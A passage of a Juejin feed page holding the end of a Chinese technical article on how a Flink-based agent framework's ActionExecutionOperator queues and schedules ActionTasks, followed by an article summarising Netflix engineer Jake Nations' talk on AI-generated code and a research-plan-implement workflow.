        <span class="hljs-keyword">return</span> tempGeneratedActionTask.invoke();
    }

    <span class="hljs-comment">// 如果没有更多步骤，标记任务完成</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ActionTaskResult(
        <span class="hljs-literal">true</span>, runnerContext.drainEvents(<span class="hljs-keyword">event</span>.getSourceTimestamp()), <span class="hljs-literal">null</span>);
}
</code></pre>
<p>也会在 processEvent 中启动新的task。</p>
<pre><code class="hljs language-scss" lang="scss">    private void <span class="hljs-built_in">processEvent</span>(Object key, Event event) throws Exception {
        <span class="hljs-built_in">notifyEventProcessed</span>(event);

        boolean isInputEvent = EventUtil<span class="hljs-selector-class">.isInputEvent</span>(event);
        if (EventUtil.isOutputEvent(event)) {
            <span class="hljs-comment">// If the event is an OutputEvent, we send it downstream.</span>
            OUT outputData = <span class="hljs-built_in">getOutputFromOutputEvent</span>(event);
            if (event.hasSourceTimestamp()) {
                output<span class="hljs-selector-class">.collect</span>(reusedStreamRecord.replace(outputData, event.getSourceTimestamp()));
            } else {
                reusedStreamRecord<span class="hljs-selector-class">.eraseTimestamp</span>();
                output<span class="hljs-selector-class">.collect</span>(reusedStreamRecord.replace(outputData));
            }
        } else {
            if (isInputEvent) {
                <span class="hljs-comment">// If the event is an InputEvent, we mark that the key is currently being processed.</span>
                currentProcessingKeysOpState<span class="hljs-selector-class">.add</span>(key);
                <span class="hljs-built_in">initOrIncSequenceNumber</span>();
            }
            <span class="hljs-comment">// We then obtain the triggered action and add ActionTasks to the waiting processing</span>
            <span class="hljs-comment">// queue.</span>
            List&lt;Action&gt; triggerActions = <span class="hljs-built_in">getActionsTriggeredBy</span>(event);
            if (triggerActions != null &amp;&amp; !triggerActions.isEmpty()) {
                for (Action triggerAction : triggerActions) {
                    actionTasksKState<span class="hljs-selector-class">.add</span>(createActionTask(key, triggerAction, event));
                }
            }
        }

        if (isInputEvent) {
            <span class="hljs-comment">// If the event is an InputEvent, we submit a new mail to try processing the actions.</span>
            mailboxExecutor<span class="hljs-selector-class">.submit</span>(() -&gt; <span class="hljs-built_in">tryProcessActionTaskForKey</span>(key), "process action task");
        }
    }
</code></pre>
<p>createActionTask 的代码如下。</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">private</span> ActionTask createActionTask(<span class="hljs-type">Object</span> <span class="hljs-keyword">key</span>, Action action, <span class="hljs-keyword">Event</span> <span class="hljs-keyword">event</span>) {
    <span class="hljs-keyword">if</span> (action.getExec() instanceof JavaFunction) {
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span> JavaActionTask(
            <span class="hljs-keyword">key</span>, <span class="hljs-keyword">event</span>, action, getRuntimeContext().getUserCodeClassLoader());
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (action.getExec() instanceof PythonFunction) {
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span> PythonActionTask(<span class="hljs-keyword">key</span>, <span class="hljs-keyword">event</span>, action);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">throw</span> <span class="hljs-built_in">new</span> IllegalStateException(
            <span class="hljs-string">"Unsupported action type: "</span> + action.getExec().getClass());
    }
}
</code></pre>
<h3 data-id="heading-38">0x04 任务队列管理</h3>
<h4 data-id="heading-39">4.1 任务状态存储</h4>
<p>ActionExecutionOperator 使用 Flink 的状态管理来存储待处理的 ActionTask：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 在 operator 中定义的状态</span>
<span class="hljs-keyword">private</span> transient ListState&lt;ActionTask&gt; actionTasksKState;

<span class="hljs-comment">// 初始化状态</span>
actionTasksKState = <span class="hljs-built_in">getRuntimeContext</span>().<span class="hljs-built_in">getListState</span>(
    <span class="hljs-keyword">new</span> ListStateDescriptor&lt;&gt;(<span class="hljs-string">"actionTasks"</span>, TypeInformation.<span class="hljs-built_in">of</span>(ActionTask.<span class="hljs-keyword">class</span>)));
</code></pre>
<h4 data-id="heading-40">4.2 任务调度机制</h4>
<p>ActionExecutionOperator 使用 Flink 的 Mailbox 机制来调度 ActionTask 的执行：</p>
<pre><code class="hljs language-scss" lang="scss">private void <span class="hljs-built_in">processEvent</span>(Object key, Event event) throws Exception {
    <span class="hljs-comment">// ... 处理事件逻辑 ...</span>
    if (isInputEvent) {
        <span class="hljs-comment">// 提交邮件任务来处理 ActionTask</span>
        mailboxExecutor<span class="hljs-selector-class">.submit</span>(() -&gt; <span class="hljs-built_in">tryProcessActionTaskForKey</span>(key), "process action task");
    }
}
</code></pre>
<h4 data-id="heading-41">4.3 任务处理循环</h4>
<p>tryProcessActionTaskForKey 方法实现了持续处理同一个 key 下的多个 ActionTask 的机制：</p>
<pre><code class="hljs language-scss" lang="scss">private void <span class="hljs-built_in">tryProcessActionTaskForKey</span>(Object key) {
    try {
        <span class="hljs-built_in">processActionTaskForKey</span>(key);
    } catch (Exception e) {
        <span class="hljs-comment">// 错误处理</span>
    }
}

private void <span class="hljs-built_in">processActionTaskForKey</span>(Object key) throws Exception {
    <span class="hljs-comment">// 1. 获取待处理的 ActionTask</span>
    ActionTask actionTask = <span class="hljs-built_in">pollFromListState</span>(actionTasksKState);

    if (actionTask == null) {
        <span class="hljs-comment">// 没有更多任务，清状态</span>
        return;
    }

    <span class="hljs-comment">// 2. 执行 ActionTask</span>
    ActionTaskResult result = actionTask<span class="hljs-selector-class">.invoke</span>();

    <span class="hljs-comment">// 3. 处理结果</span>
    if (!result.isFinished()) {
        <span class="hljs-comment">// 如果未完成，将生成的新任务加入队列</span>
        actionTasksKState<span class="hljs-selector-class">.add</span>(result.getGeneratedActionTask()<span class="hljs-selector-class">.get</span>());
    }

    <span class="hljs-comment">// 4. 处理输出事件</span>
    for (Event outputEvent : result.getOutputEvents()) {
        <span class="hljs-built_in">processEvent</span>(key, outputEvent);
    }

    <span class="hljs-comment">// 5. 如果还有任务，继续调度</span>
    if (currentKeyHasMoreActionTask()) {
        mailboxExecutor<span class="hljs-selector-class">.submit</span>(() -&gt; <span class="hljs-built_in">tryProcessActionTaskForKey</span>(key), "process action task");
    }
}        
</code></pre>
<h3 data-id="heading-42">0x05 实际应用示例</h3>
<h4 data-id="heading-43">5.1 异步 HTTP 请求处理</h4>
<p>考虑一个需要调用外部 API 的 Action：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@action(<span class="hljs-params">SomeEvent</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_external_data</span>(<span class="hljs-params">event, ctx</span>):
    <span class="hljs-comment"># 步骤1: 发起异步HTTP请求</span>
    future = asyncio.create_task(http_client.get(<span class="hljs-string">f"https://api.example.com/data/<span class="hljs-subst">{event.<span class="hljs-built_in">id</span>}</span>"</span>))

    <span class="hljs-comment"># 第一次执行到这里会暂停，返回一个生成器</span>
    response = <span class="hljs-keyword">await</span> future

    <span class="hljs-comment"># 步骤2: 处理响应数据</span>
    processed_data = process_response(response)

    <span class="hljs-comment"># 步骤3: 发送结果事件</span>
    ctx.send_event(ResultEvent(processed_data))
</code></pre>
<p>这个 Action 会被拆分为多个 ActionTask：</p>
<ul>
<li>初始任务：发起 HTTP 请求并等待</li>
<li>后续任务：处理响应并发送结果</li>
</ul>
<h4 data-id="heading-44">5.2 复杂业务流程处理</h4>
<p>一个多步骤的业务流程也可能被拆分：</p>
<pre><code class="hljs language-csharp" lang="csharp">@action(OrderEvent)
<span class="hljs-function">def <span class="hljs-title">process_order</span>(<span class="hljs-params"><span class="hljs-keyword">event</span>, ctx</span>):
    # 步骤1：验证订单
    <span class="hljs-title">validate_order</span>(<span class="hljs-params"><span class="hljs-keyword">event</span>.order</span>)
    # 步骤2：检查库存（可能需要异步调用）
    inventory_status</span> = check_inventory(<span class="hljs-keyword">event</span>.order.items)
    <span class="hljs-meta"># 步骤3：处理支付（可能需要异步调用）</span>
    payment_result = process_payment(<span class="hljs-keyword">event</span>.order)
    <span class="hljs-meta"># 步骤4：更新订单状态</span>
    update_order_status(<span class="hljs-keyword">event</span>.order.id, <span class="hljs-string">"completed"</span>)
    <span class="hljs-meta"># 步骤5：发送通知</span>
    send_notification(<span class="hljs-keyword">event</span>.customer_email, <span class="hljs-string">"Order completed"</span>)
</code></pre>
<p>每个需要等待的步骤都会生成一个新的 ActionTask，确保整个流程正确执行。</p>
<p>通过这种方式，ActionExecutionOperator 能够有效地管理和执行复杂的、可能涉及异步操作的 Action，同时保证状态的一致性和容错能力。</p>
<h3 data-id="heading-45">0xFF 参考</h3>
<p>本文使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmarkdown.com.cn" target="_blank" title="https://markdown.com.cn" ref="nofollow noopener noreferrer">markdown.com.cn</a> 排版</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Netflix工程师的警告：AI正在编写我们看不懂的代码，我们该如何应对？]]></title>    <link>https://juejin.cn/post/7592815497848029247</link>    <guid>https://juejin.cn/post/7592815497848029247</guid>    <pubDate>2026-01-08T12:52:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592815497848029247" data-draft-id="7592865044690944006" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Netflix工程师的警告：AI正在编写我们看不懂的代码，我们该如何应对？"/> <meta itemprop="keywords" content="AI编程"/> <meta itemprop="datePublished" content="2026-01-08T12:52:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Nicander"/> <meta itemprop="url" content="https://juejin.cn/user/4397684911516093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Netflix工程师的警告：AI正在编写我们看不懂的代码，我们该如何应对？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4397684911516093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Nicander
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T12:52:38.000Z" title="Thu Jan 08 2026 12:52:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{font-size:24px;display:inline-block;font-weight:700;background:#ef7060;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(239,112,96,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 50px);border-bottom:3px solid #ef7060}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #3e3e3e;margin-top:32px;margin-bottom:32px;height:1px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(27,31,35,.05);color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:JetBranins Mono,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px;background-color:#fdfdfd}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#fdfdfd}.markdown-body a{text-decoration:none;font-weight:700;color:#ef7060;border-bottom:1px solid #ef7060}.markdown-body a:active,.markdown-body a:hover{color:#ef2d26}.markdown-body table tr td,.markdown-body table tr th{border:1px solid #ccc;padding:5px 10px}.markdown-body table{display:block!important;width:auto;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{background:#f0f0f0;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#f8f8f8}.markdown-body blockquote{margin-inline-start:0;margin-inline-end:0;border-left:3px solid #ef7060;background:#fff9f9;padding:1px 20px;margin-top:20px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#a626a4}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#986801}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><blockquote>
<p>Netflix工程师Jake Nations演讲分享:</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV16PB8B1Ep8%2F%3Fspm_id_from%3D333.337.search-card.all.click" target="_blank" title="https://www.bilibili.com/video/BV16PB8B1Ep8/?spm_id_from=333.337.search-card.all.click" ref="nofollow noopener noreferrer">无限软件危机：Netflix 的 Jake Nations 解析 | AI Engineer</a></p>
</blockquote>
<p>我得坦白一件事：我曾经发布过自己并不完全理解的代码。这些代码由AI生成，通过了测试，也成功部署了，但我却无法解释它的工作原理。Netflix的工程师Jake Nations在他的演讲中以这样一句坦诚的开场白，揭示了当下软件开发领域一个日益严峻的现实。他甚至断言：“我敢打赌，在座的每一位都做过同样的事。”</p>
<p>这正是我们面临的核心矛盾：一方面，AI工具以前所未有的速度加速着软件开发，那些积压数年的重构项目如今得以完成；另一方面，它也催生了一个致命的新问题——我们对自己部署的代码，理解正在迅速减少。当系统在深夜发生故障时，我们还能像过去一样自信地进行调试吗？</p>
<p>这篇文章将为你提炼Jake Nations演讲中最具冲击力的观点，并探讨我们该如何在这场由AI驱动的变革中，重新夺回对代码和系统的主导权。</p>
<hr/>
<h2 data-id="heading-0">1. 我们掉进了“简单”与“容易”的陷阱</h2>
<p>我们面临的第一个问题，源于对两个词的根本性混淆：我们把“简单”（simple）和“容易”（easy）搞混了，而AI工具恰恰利用了这种混淆。</p>
<p>Clojure语言的创造者Rich Hickey曾对这两个概念做出过精辟的区分：</p>
<ul>
<li><strong>简单（Simple）</strong> 意味着“一褶、一辫、无缠结”（one fold, one braid, and no entanglement）。它关乎事物的结构，指的是各个部分只做一件事，互不纠缠，从而使整个系统清晰、可被理解。</li>
<li><strong>容易（Easy）</strong> 则意味着“邻近的、触手可及的、不费力的”（adjacent, within reach, without effort）。它关乎我们完成任务所需的精力，比如从Stack Overflow复制粘贴代码，或是安装一个“神奇”的框架。</li>
</ul>
<p>简单需要思考、设计和解耦，而容易则唾手可及。AI正是那个“终极的容易按钮”。它让获取代码的路径变得如此 frictionless（无摩擦），以至于我们常常忽略了那条需要更多前期思考的“简单”之路。</p>
<p>每一次我们选择容易，都是在选择当下的速度，以及未来的复杂性。</p>
<p>这种取舍之所以变得危险，是因为AI彻底打破了过去的平衡。在过去，复杂性是在代码库中缓慢累积的，我们有时间去重构、反思和重建。而现在，AI让复杂性以指数级速度复合增长，系统在我们意识到之前，就已经变得难以管理。</p>
<hr/>
<h2 data-id="heading-1">2. AI是盲目的：它将你的技术债误认为是一种模式</h2>
<p>AI工具的一个致命缺陷是：它缺乏辨别优劣的上下文。在AI眼里，你代码库中的所有代码都是需要保留和模仿的“模式”，它无法区分什么是精心设计的架构，什么是日积月累的技术债。</p>
<p>《人月神话》的作者Fred Brooks曾提出过两种复杂性：</p>
<ul>
<li><strong>本质复杂性（Essential Complexity）：</strong> 这是你试图解决的问题本身固有的难度。例如，“用户需要为商品付款”这个业务需求就是本质复杂性。</li>
<li><strong>意外复杂性（Accidental Complexity）：</strong> 这是我们在开发过程中附加的复杂性，比如临时性的变通方案、过时的抽象层、防御性代码等等。</li>
</ul>
<p>问题就在于，当AI分析你的代码库时，它会将这两种复杂性一视同仁。技术债在它看来不是“债”，只是更多需要被复制的代码模式。</p>
<p>Jake Nations分享了一个Netflix的真实案例。他们曾尝试使用AI来重构一个旧的授权系统。结果AI失败了。原因是，旧代码中的业务逻辑和授权逻辑已经紧密地<strong>交织在一起</strong>：权限检查被编织进业务流程，角色假设被<strong>固化在</strong>数据模型中，授权调用散布在数百个文件中。当AI代理开始重构时，它根本无法理清这种纠缠，常常在处理了几个文件后就因为无法解开依赖关系而<strong>陷入死循环然后放弃</strong>。更糟糕的是，它有时会试图保留旧系统的逻辑，用新的系统重新实现旧的、糟糕的设计模式。</p>
<p>只有具备上下文和经验的人类工程师，才能分辨出哪些是必须保留的精华，哪些是历史遗留的糟粕。但这需要我们慢下来思考——而AI的速度恰恰在阻止我们这样做。</p>
<hr/>
<h2 data-id="heading-2">3. 真正的危险：我们正在丧失识别问题的直觉</h2>
<p>比发布难以理解的代码更危险的，是我们作为开发者正在丧失识别复杂性的能力。</p>
<p>工程师那种“这个架构很危险”的直觉，并非与生俱来。这种模式识别能力，几乎完全是通过维护和调试失败的惨痛经历建立起来的。正如Nations所说：“当我能发现一个危险的架构时，那是因为我就是那个<strong>凌晨三点</strong>处理它引发的故障的人。”</p>
<p>然而，<strong>当你不再理解自己的系统时，这种直觉就会萎缩</strong>。我们把思考外包给了AI，跳过了那些本可以磨练我们模式识别能力的关键过程。</p>
<p>AI只会生成你要求的东西。它不会编码从过去失败中吸取的教训。</p>
<p>长此以往，我们将培养出一代只能快速生成代码，却缺乏深度理解去维护、调试或安全地演进复杂系统的开发者。这才是AI带来的最大风险。</p>
<hr/>
<h2 data-id="heading-3">4. 解决方案：用“三阶段法”重新掌握主导权</h2>
<p>面对这个困境，我们并非束手无策。Jake Nations提出了一套与AI协作的“三阶段法”。这不仅仅是一个工作流程，更是一种<strong>将人类的理解压缩成可快速评审的工件</strong>的纪律，旨在将战略思考牢牢掌握在人类手中，同时利用AI加速机械化的执行部分。</p>
<ul>
<li><strong>第一阶段：研究 (Research)</strong> 在这一阶段，我们不仅仅是把上下文信息——如架构图、设计文档——投喂给AI。这是一个<strong>反复探查</strong>的过程。我们会追问AI（“缓存策略是怎样的？”），<strong>纠正</strong>它的分析，<strong>补充</strong>它缺失的上下文。这个过程的最终产出，是一份浓缩的**“单一研究文档”**。它将数小时的探索压缩成几分钟的阅读，清晰地呈现了系统的现状、组件关系以及变更可能带来的影响。在这一阶段，设立一个“人类校验点”至关重要，由我们来验证AI的分析是否符合现实。</li>
<li><strong>第二阶段：规划 (Planning)</strong> 基于经过验证的研究成果，由人类主导，创建一个极其详尽的实现计划。这份计划需要详尽到可以称之为**“按数字填色”（paint by numbers）<strong>的级别——即使是团队里最初级的工程师，也能精确地照着它完成工作。这一步的真正魔力在于</strong>评审速度**：一份详尽的计划可以在几分钟内得到验证，而评审数千行AI生成的代码则可能需要数小时甚至数天。</li>
<li><strong>第三阶段：实施 (Implementation)</strong> 当有了一份清晰、明确、经过审查的计划后，最后一步才是让AI来执行。由于所有的思考和决策都已前置完成，我们可以将执行工作委托给一个**“后台代理”（background agent）**。开发者可以去处理其他任务，稍后再回来评审结果。评审过程也变得飞快，因为你只需验证代码是否符合计划，而无需从头理解任何新创造的逻辑。</li>
</ul>
<p>这一方法有一个至关重要的前提：<strong>你必须首先通过手动实践来赢得理解（earn the understanding）</strong>。就像Netflix的授权系统重构一样，团队必须先手动完成一个模块的迁移，才能真正摸清所有隐藏的约束和依赖，并为AI提供一个干净的、可供学习的范例。这是有效利用AI进行重构的入场券，没有捷径可走。</p>
<hr/>
<h2 data-id="heading-4">5. 最后的思考：我们为何而写代码？</h2>
<p>AI改变了我们编写代码的_方式_，但它没有改变软件工程失败的_原因_。每一代工程师都面临着自己的“软件危机”，而我们的解决方案，不应是另一个更强大的工具，而是回归到软件工程最核心的认知。</p>
<p>我们必须记住一个永恒的真理：<strong>软件是一项人类事业</strong>。正如演讲中所说：“软件开发最难的部分，从来不是敲代码，而是知道该敲什么代码。”</p>
<p>在这场变革中，最终能够脱颖而出的开发者，不会是那些生成代码最多的人，而是那些真正理解自己正在构建什么的人。</p>
<p>Jake Nations最后留给我们的，是一个值得所有人深思的问题：</p>
